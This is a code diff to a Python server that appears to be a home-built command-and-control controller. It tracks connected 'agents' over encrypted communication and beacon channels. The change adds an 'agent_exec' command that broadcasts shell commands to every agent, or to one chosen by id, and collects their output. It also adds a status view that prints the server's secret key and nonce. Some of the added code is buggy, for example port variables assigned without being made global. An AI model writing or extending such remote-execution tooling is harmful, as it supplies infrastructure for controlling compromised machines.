@@ -12,6 +12,7 @@ import datetime
 import json
 import random
 import time
+import ctypes
 
 os_info = {
         "OS Name": os.name,
@@ -36,6 +37,9 @@ agents_lock = threading.Lock()
 
 key = 0
 nonce = 0
+
+com_port = 0
+bea_port = 0
 
 class Agent:
     b_sock=0
@@ -63,8 +67,11 @@ def start_listen():
     # Get the port number
     port = sock.getsockname()[1]
     print("*Start communicate channel on port: {}".format(port))
+    com_port = port
+
     port = b_sock.getsockname()[1]
     print("*Start beacon channel on port: {}".format(port))
+    bea_port = port
     
     # Listen for connections (optional)
     sock.listen(64)
@@ -77,7 +84,7 @@ def start_listen():
             nonce_ = sec_recv(client_socket, key, nonce)
             if nonce_ == nonce:
                 # Start a new thread to handle the client
-                print("*New connection from {}".format(client_address))
+                print("\n*New connection from {}".format(client_address))
                 with agents_lock:
                     n_agents+=1
                     nAgent = Agent(client_socket, client_address, beacon_socket, n_agents)
@@ -196,12 +203,52 @@ def sec_sendall2all(message: bytes, agents: list, key, nonce):
     for agent in agents:
         sec_sendall(message, agent.sock, key, nonce)
 
-def excute_cmd(cmd_args: list):
+def excute_cmd(cmd_args: list): ###
+   try:
     match cmd_args[0]:
+        case "":
+            return
         case "agents":
             agents_cmd(cmd_args)
         case "server":
             server_cmd(cmd_args)
+        case "agent_exec":
+            agent_exec_cmd(cmd_args)
+        case "help":
+            with open("help.txt",'r') as help_:
+                print(help_.read())
+        case _:
+            print("*Unknown command. Please type \"help\" for help.")
+   except:
+    print("*Unknown command. Please type \"help\" for help.")
+
+def agent_exec_cmd(cmd_args: list):
+    match cmd_args[1]:
+        case "all":
+            agent_cmd = "exec " + cmd_args[2]
+            if cmd_args[2][0] == "\"":
+                i = 3
+                agent_cmd += cmd_args[i]
+                while cmd_args[i][-1] != "\"":
+                    i+=1
+                    agent_cmd += cmd_args[i]
+            sec_sendall2all(agent_cmd.encode(),agents, key, nonce)
+            for agent in agents:
+                print("Agent's id: {}\nAgent's name: {}\nAgent's address: {}\nAgent's output:\n{}\n\n---\n"
+                      .format(agent.id, agent.name, agent.address, sec_recv(agent.sock,key,nonce).decode()))
+        
+        case "id":
+            for agent in agents:
+                if(str(agent.id)==cmd_args[2]):
+                    agent_cmd = "exec " + cmd_args[3]
+                    if cmd_args[3][0] == "\"":
+                        i = 4
+                        agent_cmd += cmd_args[i]
+                        while cmd_args[i][-1] != "\"":
+                            i+=1
+                            agent_cmd += cmd_args[i]
+                    sec_sendall(agent_cmd.encode(),agent.sock, key, nonce)
+
         case "help":
             with open("help.txt",'r') as help_:
                 print(help_.read())
@@ -248,7 +295,7 @@ def agents_cmd(cmd_args: list):
 def server_cmd(cmd_args: list):
     match cmd_args[1]:
         case "status":
-            print("Server's communicate port: {}\nServer's beacon port: {}\nServer's secret key: {}\nServer's nonce: {}\nServer's OS info:")
+            print("Server's communicate port: {}\nServer's beacon port: {}\nServer's secret key: {}\nServer's nonce: {}\nServer's OS info:".format(com_port,bea_port,base64.b64encode(key).decode("utf-8"),base64.b64encode(nonce).decode("utf-8")))
             for key, value in os_info.items():
                 print("{}: {}".format(key,value))
 
